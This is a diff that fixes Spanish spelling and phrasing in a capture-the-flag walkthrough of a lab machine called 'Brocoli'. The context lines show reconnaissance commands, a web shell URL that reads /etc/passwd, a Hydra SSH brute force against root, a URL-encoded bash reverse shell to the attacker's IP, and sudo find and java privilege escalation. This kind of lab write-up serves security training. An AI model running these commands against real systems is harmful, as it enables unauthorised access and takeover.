@@ -37,7 +37,7 @@ Fecha: 2026-03-10
 ---
 <img width="1024" height="1024" alt="Pasted image 20260310082813" src="https://github.com/user-attachments/assets/a623b2dc-f6a2-47a7-9820-f6ec76a9e05b" />
 
-Vamos a empezar con un reconocimiento de la red para saber la *IP* de la maquina.
+Vamos a empezar con un reconocimiento de la red para saber la *IP* de la máquina.
 
 ```bash
  sudo arp-scan -I eth0 --localnet                                  
@@ -54,7 +54,7 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 1.947 seconds (131.48 hosts/sec). 3 responded
 ```
 
-Observamos que la *IP* de la maquina objetivo es la *10.0.11.15* así que empezaremos con la enumeración de puertos.
+Observamos que la *IP* de la máquina objetivo es la *10.0.11.15*, así que empezaremos con la enumeración de puertos.
 
 ```bash
  settarget 10.0.11.15            
@@ -107,9 +107,9 @@ Tenemos 2 puertos abiertos:
 
 Veamos que podemos ver en la web.
 
-Pero solo tenemos la pagina por defecto de *Apache* con los logos de *Ubuntu*.
+Pero solo tenemos la página por defecto de *Apache* con los logos de *Ubuntu*.
 
-Pasemos a enumerar las carpetas a ver que encontramos.
+Pasemos a enumerar las carpetas a ver qué encontramos.
 
 ```bash
  gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
@@ -217,13 +217,13 @@ Started: Tue Mar 10 09:40:47 2026
 Stopped: Tue Mar 10 09:41:04 2026
 ```
 
-Con este decode obtenemos una contraseña que puede ser para un usuario llamado `brocoli` con una contraseña `informebrocoli`, pero hay algo que me llama la atención y es el fichero `brocoli.php`.
+Con este descifrado obtenemos una contraseña que podría pertenecer a un usuario llamado `brocoli`, pero hay algo que me llama la atención: el fichero `brocoli.php`.
 
 ```http
 http://10.0.11.15/uploads/brocoli.php?cmd=cat+/etc/passwd
 ```
 
-Y como no, es un fichero que nos permite tener una **Web Shell** para poder encontrar el fichero `/etc/passwd` y ver los usuarios.
+Y, efectivamente, es un fichero que nos permite tener una **web shell** para consultar `/etc/passwd` y ver los usuarios.
 
 ```bash
 |root:x:0:0:root:/root:/bin/bash|
@@ -293,7 +293,7 @@ Permission denied, please try again.
 root@10.0.11.15's password: 
 ```
 
-Parece que la contraseña `mecmec` no ha servido, puede que sea solo una referencia al *corre caminos* de los dibujos animados.
+Parece que la contraseña `mecmec` no ha servido; puede que sea solo una referencia al *Correcaminos* de los dibujos animados.
 
 Por este motivo usaremos **Hydra** contra *SSH*.
 
@@ -303,7 +303,7 @@ Por este motivo usaremos **Hydra** contra *SSH*.
  hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
 ```
 
-Pero ninguna funciono, así que usaremos el `Web Shell` para generar una `Revershell` y poder conectar como el usuario *www-data* y desde hay ir pivotando y escalando privilegios.
+Pero ninguna funcionó, así que usaremos la `web shell` para generar una `reverse shell` y poder conectar como el usuario *www-data* y desde ahí ir pivotando y escalando privilegios.
 
 ```http
 http://10.0.11.15/uploads/brocoli.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.0.11.11/443%200%3E%261%27
@@ -338,7 +338,7 @@ Credenciales:
 www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$
 ```
 
-Parece que ya tenemos el primer `usuario:contraseña` despues de busacar un poco.
+Parece que ya tenemos el primer par `usuario:contraseña` después de buscar un poco.
 
 Empecemos a indagar y seguir escalando.
 
@@ -356,7 +356,7 @@ User brocoli may run the following commands on TheHackersLabs-Brocoli:
 brocoli@TheHackersLabs-Brocoli:~$
 ```
 
-Parece que tenemos el primer pivotin de usuario y ademas tenemos la opción de hacer una escalada a `brocolon` desde el binario **find**.
+Parece que tenemos el primer *pivoting* de usuario y, además, tenemos la opción de escalar a `brocolon` desde el binario **find**.
 
 ```bash
 brocoli@TheHackersLabs-Brocoli:~$ cd /var/www/html/uploads/
@@ -367,7 +367,7 @@ $ /bin/bash
 brocolon@TheHackersLabs-Brocoli:/var/www/html/uploads$ 
 ```
 
-Cabe destacar que nos tuvimos que mover a un directorio donde el usuario `brocolon` tuviese permisos de lectura, en caso contrario el comando de escalada no funciono.
+Cabe destacar que nos tuvimos que mover a un directorio donde el usuario `brocolon` tuviese permisos de lectura; en caso contrario, el comando de escalada no funcionó.
 
 Ahora investiguemos a ver si podemos llegar a ser **root**.
 
@@ -380,7 +380,7 @@ User brocolon may run the following commands on TheHackersLabs-Brocoli:
     (ALL : ALL) NOPASSWD: /usr/bin/java
 ```
 
-Parece que podemos ser `root` a través de **java** pero implica un paso mas, primero tenemos que crear un fichero `shell.java` pero esto no seria posible sin un compilador de *java*, pero hay algunas versiones de *java* que realizan un compilado temporal.
+Parece que podemos ser `root` a través de **java**, pero implica un paso más. Primero tenemos que crear un fichero `shell.java`; normalmente esto no sería posible sin un compilador de *Java*, pero hay algunas versiones que realizan un compilado temporal.
 
 ```bash
 openjdk version "21.0.9" 2025-10-21
@@ -390,7 +390,7 @@ OpenJDK 64-Bit Server VM (build 21.0.9+10-Ubuntu-124.04, mixed mode, sharing)
 
 Esta versión nos permite realizar esta acción.
 
-El código que usaremos sera el siguiente:
+El código que usaremos será el siguiente:
 
 ```java
 import java.io.*;
@@ -420,4 +420,4 @@ congrats.txt  root.txt
 
 Con esto ya hemos terminado el laboratorio.
 
-Ha sido interesante llegar a escalar los privilegios a través de los distintos usuarios y la posibilidad de tener directamente un `Web Shell`, lo cual es una falla de seguridad.
+Ha sido interesante escalar privilegios a través de distintos usuarios y aprovechar la existencia directa de una `web shell`, lo cual constituye una falla de seguridad bastante seria.
